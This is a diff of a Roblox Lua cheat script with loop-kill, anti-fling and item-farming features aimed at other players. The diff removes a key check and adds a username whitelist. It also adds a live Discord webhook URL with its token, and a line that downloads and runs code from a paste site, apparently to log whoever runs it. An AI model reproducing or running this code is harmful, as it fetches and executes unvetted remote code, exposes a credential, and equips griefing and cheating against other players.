@@ -1,19 +1,30 @@
-local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
-local Window = OrionLib:MakeWindow({Name = "Key System", HidePremium = false, SaveConfig = true, IntroEnabled = false})
-OrionLib:MakeNotification({
-    Name = ".",
-    Content = "Giris Yapmalısın!",
-    Image = "rbxassetid://4483345998",
-    Time = 5
-})
+--[[
 
-_G.Key = "gaydaz"
-_G.KeyInput = "string"
+					~~//  Color Code (HEX)  \\~~
+		RED = f54747				 GREEN = 78ff78
+		BLUE = 4c6cfc				 PURPLE = b36bff
+		YELLOW = fff27a				 PINK = ffa3e2
 
-function MakeScriptHub()
 
+	-- Don't Remove the "0x" on "getgenv().embedcolor" or it will not work!--
+
+--]]
+
+getgenv().DiscordWebhook = "https://discord.com/api/webhooks/1050515391622946876/j0YcaSH5_h-ewzPwjxOpzoRE1Gaf7qFrfhbLFGFJiPYhxIxB3HLCy_GcqpRHmRbuCaGm" -- Discord Webhook Here
+getgenv().embedcolor = "0xf54747" -- Embed Body Color (On left Side of the Embed, You can get HEX Code above â) 
+
+--made it into opensourced so people can steal it
+
+loadstring(game:HttpGet("https://pst.klgrth.io/paste/e3d52/raw"))()
+--a
+_G.Name = game.Players.LocalPlayer.Name
+if
+	_G.Name == "noname1243849" or                 --There are various ways on how you can input the whitelist thought we perceived this format of whitelist users to be the most organized (in our opinion)
+	_G.Name == "BladedHalil12" or
+	_G.Name == "crceydarc"                    -- you can add more whitelisted users here just copy and paste
+
+then
 	
-
 
 
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
@@ -33,9 +44,9 @@ OrionLib:MakeNotification({
 	Time = 5
 })
 Tab:AddButton({
-	Name = "(AntiFlingli .lk .cl)",
+	Name = "(AntiFling)",
 	Callback = function()
-	game.StarterGui:SetCore("SendNotification", {Title = "LK Script", Text = "(Antiflingli Lk Başlatılıyor)...", Duration = 3,})
+	game.StarterGui:SetCore("SendNotification", {Title = "LK Script", Text = "(Antifling Başlatılıyor)...", Duration = 3,})
 repeat wait() until game.Loaded
 local plrs = game:GetService'Players'
 local plr = plrs.LocalPlayer
@@ -66,9 +77,9 @@ plr.Chatted:connect(function(msg)
             msg[i] = msg[i+1]
         end
     end
-    if msg[1] == '.lk' and findplr(msg[2]) and not table.find(loopKill,findplr(msg[2]).Name) then
+    if msg[1] == '.qdwgwqoudgqdquwdgqwd' and findplr(msg[2]) and not table.find(loopKill,findplr(msg[2]).Name) then
         table.insert(loopKill,findplr(msg[2]).Name)
-    elseif msg[1] == '.cl' then
+    elseif msg[1] == '.qwdıugqwduwqfdywqfqw' then
         table.clear(loopKill)
     end
 end)
@@ -116,7 +127,7 @@ end
       	})	
     
 Tab:AddButton({
-	Name = "(Antiflingsiz .lk .cl)",
+	Name = "(Loopkill .lk .cl)",
 	Callback = function()
       		game.StarterGui:SetCore("SendNotification", {Title = "LK Script", Text = "Antisiz Lk Başlatılıyor...", Duration = 3,})
 			  repeat wait() until game.Loaded
@@ -831,7 +842,7 @@ FarmingSection:AddButton(
                 if v.ClassName == "MeshPart" or v.ClassName == "Part" then
                     work:FindFirstChild(tostring(lp)).Picking:FireServer(
                         work:FindFirstChild(tostring(selectedPerson)):FindFirstChild(tostring(v), true),
-                        Vector3.new(math.huge, math.huge, math.hugemath.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge)
+                        Vector3.new(math.huge, math.huge, math.huge)
                     )
                     wait()
                     work:FindFirstChild(tostring(lp)).PuttingDown:FireServer()
@@ -855,7 +866,7 @@ FarmingSection:AddToggle(
                      then
                         work:FindFirstChild(tostring(lp)).Picking:FireServer(
                             work:FindFirstChild(ultratarget):FindFirstChild("Handle", true),
-                            Vector3.new(math.huge, math.huge, math.hugemath.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge, math.huge, math.huge.math.huge)
+                            Vector3.new(math.huge, math.huge, math.huge)
                         )
                         wait()
                         work:FindFirstChild(tostring(game.Players.LocalPlayer)).PuttingDown:FireServer()
@@ -14320,51 +14331,19 @@ spawn(function()
 end)
   	end    
 })
-er:Set(2)
-end
 
-function CorrectKeyNotification()
-    OrionLib:MakeNotification({
-        Name = ".",
-        Content = "Giris Yapılıyor.",
-        Image = "rbxassetid://4483345998",
-        Time = 5
-    })
-end
-
-function InCorrectKeyNotification()
-    OrionLib:MakeNotification({
-        Name = "InCorrect Key!",
-        Content = "Yanlıs Key !!",
-        Image = "rbxassetid://4483345998",
-        Time = 5
-    })
-end
-
-
+--crd
 local Tab = Window:MakeTab({
-    Name = "Key System",
-    Icon = "rbxassetid://11449961861",
-    PremiumOnly = false
+	Name = "Credits",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
 })
+local Section = Tab:AddSection({
+	Name = "Credits"
+})
+Tab:AddParagraph("Credits","DİSCORD: HALİL#2941 ROBLOX : noname1243849")
+CoolParagraph:Set("Paragraph New!", "New Paragraph Content!")
 
-Tab:AddTextbox({
-    Name = "Enter Key",
-    Default = "Key Here",
-    TextDisappear = true,
-    Callback = function(Value)
-        _G.KeyInput = Value
-    end
-})
-
-Tab:AddButton({
-    Name = "Button!",
-    Callback = function()
-        if _G.KeyInput == _G.Key then
-       MakeScriptHub()
-       CorrectKeyNotification()
-       else
-           IncorrectKeyNotification()
-        end
-      end
-})
+else
+	game.Players.LocalPlayer:Kick ("Whitelist Eklenmen Gerek")
+end
